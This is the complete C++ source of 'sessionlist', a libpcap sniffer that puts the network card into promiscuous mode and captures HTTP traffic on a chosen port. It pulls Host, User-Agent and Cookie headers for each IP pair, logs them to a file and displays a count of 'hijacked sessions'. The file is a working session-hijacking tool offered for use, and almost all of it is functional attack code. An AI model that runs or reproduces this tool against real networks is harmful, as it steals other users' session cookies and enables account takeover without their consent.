/*
 * Main packet inspection and processing module.
 *
 * Copyright (C) 2012 Feiad Mohammed
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#include "sessionlist.h"

pcap_t *handle;			/* Session handle */
//char *dev;			/* The device to sniff on */
char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
struct bpf_program fp;		/* The compiled filter */
bpf_u_int32 mask;		/* Our netmask */
bpf_u_int32 net;		/* Our IP */
struct pcap_pkthdr header;	/* The header that pcap gives us */
const u_char *packet;		/* The actual packet */
char s_filter_exp[16]; //"dst port 80";	/* The filter expression. make port user configgable */
FILE *sessionFile;
int totalFoundSessions;

std::list<SESSION_INFO> SESSION_LIST;
volatile bool killLoop;
pthread_mutex_t tMutex;

int sessionlist_init(char *dev,int cport)
{
    //set filter expression
    snprintf(s_filter_exp,16,"dst port %i",cport);
    //banner
    char sBannerBuffer[1024]="***************************************************\nsessionlist v1.0\n***************************************************\n\n";
    killLoop=false;
    totalFoundSessions=0;
	/* Define the device */
	//dev = pcap_lookupdev(errbuf);
	if (dev == NULL) {
		fprintf(stderr, "Couldn't find device: %s\n", errbuf);
		return(2);
	}
	/* Find the properties for the device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	/* Open the session in promiscuous mode */
	handle = pcap_open_live(dev, BUFSIZ, 1, 0, errbuf); //timeout for testing set to 10000
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	/* Compile and apply the filter */
	if (pcap_compile(handle, &fp, s_filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", s_filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", s_filter_exp, pcap_geterr(handle));
		return(2);
	}

    //set signal handler
	signal(SIGINT,sessionlist_close);

	//drop privs
	//dropPrivs();

    //prep sessions output file
	sessionFile=fopen("./sessions.txt","ab");
	if(ftell(sessionFile)==0) fwrite(sBannerBuffer,strlen(sBannerBuffer),1,sessionFile);

	//init ncurses
	if(NCURSES_ENABLED)
	{
	    initscr();
        //raw();
        //noecho();
	}

	return 0;
}

void *sessionlist_startcapture(void *notused)
{
    if(!handle) return 0;
    /* Grab packets */
	while((packet = pcap_next(handle, &header)) && !killLoop)
	{
	    //process packets
	    sessionlist_processPacket(packet,header.len);
	}
	//properly terminate
	sessionlist_close(1);

	return 0;
}

void sessionlist_close(int sig)
{
    killLoop=true;
    //perhaps check that signal is what we expect. for now just close handle if it exists.
    if(handle) pcap_close(handle);
    //list
    if(!SESSION_LIST.empty()) { clearPayloadsFromlist(); SESSION_LIST.clear(); }
    //sessionfile
    if(sessionFile) { fclose(sessionFile); sessionFile=NULL; }
    //close ncurses
    if(NCURSES_ENABLED) endwin();
    //terminate
    exit(0);
}

void clearPayloadsFromlist()
{
    std::list<SESSION_INFO>::iterator it=SESSION_LIST.begin();
    std::list<unsigned char*>::iterator pit;

    while(it!=SESSION_LIST.end())
    {
        pit=it->pData.begin();
        while(pit!=it->pData.end())
        {
            free(*pit);
            pit++;
        }
        it++;
    }
}

void sessionlist_processPacket(const unsigned char *packet,int packetHeaderLen)
{
    unsigned char *payload;
    unsigned int port;
    int n,plen,size_ip,size_tcp;
    struct sniff_ip *ip;
    struct sniff_tcp *tcp;

    char tether_src[128],tether_dst[128],tip_src[128],tip_dst[128];

    //ether
    n=snprintf(tether_dst,128,"%x:%x:%x:%x:%x:%x",((struct sniff_ethernet*)packet)->ether_dhost[0],
           ((struct sniff_ethernet*)packet)->ether_dhost[1],((struct sniff_ethernet*)packet)->ether_dhost[2],
           ((struct sniff_ethernet*)packet)->ether_dhost[3],((struct sniff_ethernet*)packet)->ether_dhost[4],
           ((struct sniff_ethernet*)packet)->ether_dhost[5]);

    n=snprintf(tether_src,128,"%x:%x:%x:%x:%x:%x",((struct sniff_ethernet*)packet)->ether_shost[0],
           ((struct sniff_ethernet*)packet)->ether_shost[1],((struct sniff_ethernet*)packet)->ether_shost[2],
           ((struct sniff_ethernet*)packet)->ether_shost[3],((struct sniff_ethernet*)packet)->ether_shost[4],
           ((struct sniff_ethernet*)packet)->ether_shost[5]);

    //ip
    ip=((struct sniff_ip*)(packet+sizeof(struct sniff_ethernet)));
    n=snprintf(tip_src,128,"%s",inet_ntoa(ip->ip_src));
    n=snprintf(tip_dst,128,"%s",inet_ntoa(ip->ip_dst));

    size_ip=IP_HL(ip)*4;
    if(size_ip<20) { printf("invalid header len\n"); return; }

    if(ip->ip_p!=IPPROTO_TCP) { printf("not tcp/ip\n"); return; }

    //tcp
    tcp=((struct sniff_tcp*)(packet+sizeof(struct sniff_ethernet)+size_ip));
    size_tcp=TH_OFF(tcp)*4;
    port=ntohs(tcp->th_dport);

    payload=(unsigned char*)(packet+sizeof(struct sniff_ethernet)+size_ip+size_tcp);
    plen=ntohs(ip->ip_len)-(size_ip+size_tcp);
    if(DEBUG) printf("-----------------------------------------------------------------------\npayload size: %d\n",plen);
    payload[plen]=0;

    //process
    if(plen<1) return;
    updateSessionlist(tether_src,tether_dst,tip_src,tip_dst,port,payload,plen);
}

void updateSessionlist(char *eth_src,char *eth_dst,char *ip_src,char *ip_dst,unsigned int port,unsigned char *payload,int payloadSize)
{
    if(DEBUG)
    {
        printf("ether src: %s\n\ether dst: %s\nip src: %s\nip dst: %s\nport: %i\npayload: %s\n",eth_src,eth_dst,ip_src,ip_dst,port,payload);
    }
    updateSessionByIPs(eth_src,eth_dst,ip_src,ip_dst,port,payload,payloadSize);
}

void updateSessionByIPs(char *eth_src,char *eth_dst,char *ip_src,char *ip_dst,unsigned int port,unsigned char *payload,int payloadSize)
{
    std::list<SESSION_INFO>::iterator it=SESSION_LIST.begin();
    std::list<SESSION_INFO>::iterator itEnd=SESSION_LIST.end();
    int sessionCount;

    if(SESSION_DEBUG) printf("updateSessionByIPs\n");
    sessionCount=0;
    while(it!=itEnd)
    {
        if(SESSION_DEBUG) printf("comparing %s with %s\ncomparing %s with %s\n",it->ip_src,ip_src,it->ip_dst,ip_dst);
        if(strcmp(it->ip_src,ip_src)==0 && strcmp(it->ip_dst,ip_dst)==0)
        {
            if(SESSION_DEBUG) printf("found matching session for data at session index: %i\n",sessionCount);
            //pthread_mutex_lock(&tMutex);
            addPayloadToSession(it,payload,payloadSize);
            return;
        }
        if(strcmp(it->ip_src,ip_dst)==0 && strcmp(it->ip_dst,ip_src)==0)
        {
            //if(SESSION_DEBUG)
            printf("found matching session for data at session index: %i\n",sessionCount);
            //pthread_mutex_lock(&tMutex);
            addPayloadToSession(it,payload,payloadSize);
            return;
        }
        it++;
        sessionCount++;
    }
    //pthread_mutex_lock(&tMutex);
    addSessionToSessionList(eth_src,eth_dst,ip_src,ip_dst,port,payload,payloadSize);
}

void addPayloadToSession(std::list<SESSION_INFO>::iterator Session,unsigned char *payload,int payloadSize)
{
    unsigned char *npayload;

    //add
    if(SESSION_DEBUG) printf("addPayloadToSession\n");

    //allocate memory for new payload buffer
    //npayload=new unsigned char[payloadSize+1];
    npayload=(unsigned char*)malloc(payloadSize+1);
    memcpy(npayload,payload,payloadSize);

    //filter
    if(checkPayload(payload,Session,payloadSize)) { if(SESSION_DEBUG) printf("session exists, adding payload!\n"); Session->pData.push_back(npayload); }
    else delete npayload;
    //pthread_mutex_unlock(&tMutex);
}

void addSessionToSessionList(char *eth_src,char *eth_dst,char *ip_src,char *ip_dst,unsigned int port,unsigned char *payload,int payloadSize)
{
    SESSION_INFO si;
    std::list<SESSION_INFO>::iterator tIt;
    if(SESSION_DEBUG) printf("addSessionToSessionList\n");
    int currentSessionSize=SESSION_LIST.size();
    unsigned char *npayload;

    //allocate memory for new payload buffer
    //npayload=new unsigned char[payloadSize+1];
    npayload=(unsigned char*)malloc(payloadSize+1);
    memcpy(npayload,payload,payloadSize);

    //filter
    if(!preCheck(payload)) { pthread_mutex_unlock(&tMutex); return; } //added (bug fix i would imagine)
    if(SESSION_DEBUG) printf("creating new session for payload!\n");
    strcpy(si.ether_src,eth_src);
    strcpy(si.ether_dst,eth_dst);
    strcpy(si.ip_src,ip_src);
    strcpy(si.ip_dst,ip_dst);
    si.port=port;
    si.cStarted=si.cEnded=si.cFound=si.lWritten=false; //added
    if(checkPayload(payload,si,payloadSize)) si.pData.push_back(npayload);
    else delete npayload;
    SESSION_LIST.push_back(si);

    if(SESSION_DEBUG) printf("adding new session to session slot: %i\n",currentSessionSize+1);
}

// *************
// filter - multipacket spanning added for cookie keyword
// *************
bool checkPayload(unsigned char *payload,std::list<SESSION_INFO>::iterator session,int payloadSize)
{
    char *off;
    char *cOff;

    //check for interesting properties
    if(strcasestr((const char*)payload,(const char*)"host:")) return true;
    if(strcasestr((const char*)payload,(const char*)"user-agent:")) return true;
    cOff=strcasestr((char*)payload,(const char*)"cookie:");
    if(cOff)
    {
        session->cStarted=true;
        //log after cookie to end of payload

        //check if first packet is also the end
        if(off=(char*)strstr((const char*)&cOff[7],(const char*)"\r\n")) session->cEnded=session->cFound=true; //added

        return true;
    }
    if(session->cStarted && !session->cEnded)
    {
        //check for end
        if(off=(char*)strstr((const char*)payload,(const char*)"\r\n"))
        {
            //log cookie data - based on off

            //done looking
            session->cEnded=session->cFound=true; //could set sessionstarted=false but not necessary
        }
        //log cookie data - based on payloadSize

        return true;
    }
    return false;
}

bool checkPayload(unsigned char *payload,SESSION_INFO session,int payloadSize)
{
    char *off;
    char *cOff;

    //check for interesting properties
    if(strcasestr((const char*)payload,(const char*)"host:")) return true;
    if(strcasestr((const char*)payload,(const char*)"user-agent:")) return true;
    cOff=strcasestr((char*)payload,(const char*)"cookie:");
    if(cOff)
    {
        session.cStarted=true;
        //log after cookie to end of payload

        //check if first packet is also the end
        if(off=(char*)strstr((const char*)&cOff[7],(const char*)"\r\n")) session.cEnded=session.cFound=true; //added

        return true;
    }
    if(session.cStarted && !session.cEnded)
    {
        //check for end
        if(off=(char*)strstr((const char*)payload,(const char*)"\r\n"))
        {
            //log cookie data - based on off

            //done looking
            session.cEnded=session.cFound=true; //could set sessionstarted=false but not necessary
        }
        //log cookie data - based on payloadSize

        return true;
    }
    return false;
}

void displayUsableSessionInfo()
{
    std::list<SESSION_INFO>::iterator it;
    std::list<SESSION_INFO>::iterator itEnd;
    char host[1024];
    char userAgent[4096];
    char cookie[4096];
    char wBuffer[10240];
    char wBufferSetup[128];
    char oBuffer[2048];
    int n,n2,nSetup;
    int sessionCount;
    int sessionTotalCount;

    //init
    it=SESSION_LIST.begin();
    itEnd=SESSION_LIST.end();
    sessionTotalCount=SESSION_LIST.size()-1;
    sessionCount=0;

    //clear screen for display of all session data if present --moved to display thread
    //clear();
    //lock
    //pthread_mutex_lock(&tMutex);
    if(SESSION_TO_FILE && SESSION_DEBUG)
    {
        nSetup=snprintf(wBufferSetup,128,"writing full session list as of now..[%i sessions]\n",sessionTotalCount);
        fwrite(wBufferSetup,nSetup,1,sessionFile);
    }
    n2=snprintf(oBuffer,2048,"***************************************************\nsessionlist v1.0\n***************************************************\n");
    n2+=snprintf(&oBuffer[n2],2048-n2,"\tc0ded by rage\n***************************************************\n");
    n2+=snprintf(&oBuffer[n2],2048-n2,"Current hijacked sessions: %i out of %i tracked sessions\n\n",totalFoundSessions,sessionTotalCount+1);
    while(it!=itEnd)
    {
        //clear
        memset(host,0,1024);
        memset(userAgent,0,4096);
        memset(cookie,0,4096);
        //check for usable session data
        if(hasUsableSessionInfo(it,host,userAgent,cookie) && !it->lWritten) //added
        {
            n=snprintf(wBuffer,10240,"Session %i of %i - IP: %s IP: %s - payload elements: %i\n",sessionCount,sessionTotalCount,it->ip_src,it->ip_dst,it->pData.size());
            n+=snprintf(&wBuffer[n],10240-n,"Host: %s\nuser-agent: %s\ncookie: %s\n",host,userAgent,cookie);
            n2+=snprintf(&oBuffer[n2],2048-n2,"Found data for Host: %s\n",host);

            if(SESSION_TO_FILE && !it->lWritten)
            {
                fwrite(wBuffer,n,1,sessionFile);
                it->lWritten=true; //added
                totalFoundSessions++;
            }
        }
        //next
        it++;
        sessionCount++;
    }
    if(SESSION_TO_FILE && SESSION_DEBUG)
    {
        nSetup=snprintf(wBufferSetup,128,"end full session list as of now..[%i sessions]\n",sessionTotalCount);
        fwrite(wBufferSetup,nSetup,1,sessionFile);
    }
    //unlock
    //pthread_mutex_unlock(&tMutex);
    //draw data to screen --moved to display thread
    //refresh();
    if(NCURSES_ENABLED) { clear(); printw("%s\n",oBuffer); refresh(); }
    else { system("clear"); printf("%s\n",oBuffer); } //added (put clear back in ""s)
    //flush
    fflush(sessionFile);
}

bool hasUsableSessionInfo(std::list<SESSION_INFO>::iterator session,char *host,char *userAgent,char *cookie)
{
    std::list<unsigned char*>::iterator pIt=session->pData.begin();
    std::list<unsigned char*>::iterator pItEnd=session->pData.end();
    bool hFound=false;
    bool cFound=false;
    bool uFound=false;
    int hCount=0;
    int uCount=0;
    int cCount=0;

    while(pIt!=pItEnd)
    {
        if(strcasestr((const char*)*pIt,"host:") && !hFound) // &&!hFound for getting only first
        {
            extractData((const char*)*pIt,"host:",host,1023);
            hFound=true;
        }
        if(strcasestr((const char*)*pIt,"cookie:") && !cFound) // added
        {
            extractCookieData(pIt,pItEnd,cookie,4095);
            cFound=true;
        }
        if(strcasestr((const char*)*pIt,"user-agent:") &&!uFound) // &&!uFound for getting only first
        {
            extractData((const char*)*pIt,"user-agent:",userAgent,4095);
            uFound=true;
        }
        pIt++;
    }
    if(cFound && uFound && hFound) return true;
    return false;
}

void extractData(const char *data,char *target,char *extracted,int extractedLen)
{
    char *off;
    int i=0;

    off=strcasestr((char*)data,target);
    if(!off) return; //shouldnt happen as this is checked by caller

    off=off+strlen(target);
    while(1)
    {
        if(i>=extractedLen) break;
        extracted[i]=off[i];
        if(off[i-1]=='\r' && off[i]=='\n') break;
        i++;
    }
    extracted[i]=0;
}

bool preCheck(unsigned char *payload)
{
    if(strcasestr((const char*)payload,(const char*)"host:")) return true;
    if(strcasestr((const char*)payload,(const char*)"user-agent:")) return true;
    if(strcasestr((const char*)payload,(const char*)"cookie:")) return true;
    return false;
}

std::list<SESSION_INFO>::iterator findSessionByCount(int tCount)
{
    std::list<SESSION_INFO>::iterator it=SESSION_LIST.begin();
    std::list<SESSION_INFO>::iterator itEnd=SESSION_LIST.end();
    int count=1;

    while(count!=tCount && it!=itEnd)
    {
        count++;
        it++;
    }
    if(SESSION_DEBUG) printf("findSessionByCount returning iterator for the %ith item in list\n",count);
    return it;
}

void extractCookieData(std::list<unsigned char*>::iterator pData,std::list<unsigned char*>::iterator pEnd,char *cookie,int cookieLen)
{
    int count=0,n,offSize;
    char *off,*offEnd;
    //search
    while(pData!=pEnd)
    {
        off=(char*)strcasestr((const char*)*pData,"cookie:");
        offEnd=(char*)strcasestr((const char*)*pData,"\r\n");
        if(off)
        {
            //first
            n=snprintf(&cookie[count],cookieLen-count,"%s",(const char*)(&off[strlen("cookie:")]));
            //check for end
            if(offEnd)
            {
                offSize=(unsigned long)offEnd-(unsigned long)(&off[strlen("cookie:")]);
                if(count+offSize>cookieLen) cookie[cookieLen]=0;
                else cookie[count+offSize]=0;
                return;
            }
            count+=n;
        }
        else
        {
            //continued
            n=snprintf(&cookie[count],cookieLen-count,"%s",(const char*)(*pData));
            //check for end
            if(offEnd)
            {
                offSize=(unsigned long)offEnd-(unsigned long)(*pData);
                if(count+offSize>cookieLen) cookie[cookieLen]=0;
                else cookie[count+offSize]=0;
                return;
            }
            count+=n;
        }
        pData++;
    }

}

void dropPrivs()
{
    struct passwd *pwds;
    char target[] = "nobody";
    uid_t nuid;
    gid_t ngid;

    while(pwds=getpwent())
    {
        if(strcmp(pwds->pw_name,target)==0)
        {
            printf("found name: %s\n",pwds->pw_name);
            nuid=pwds->pw_uid;
            ngid=pwds->pw_gid;
            errno=0;
            if(setgid(ngid)!=0)
            {
                printf("errno: %i\n",errno);
            }
            if(setuid(nuid)!=0)
            {
                printf("errno: %i\n",errno);
            }
        }
    }
    getch();
}


//end of file for parsing IDE reasons
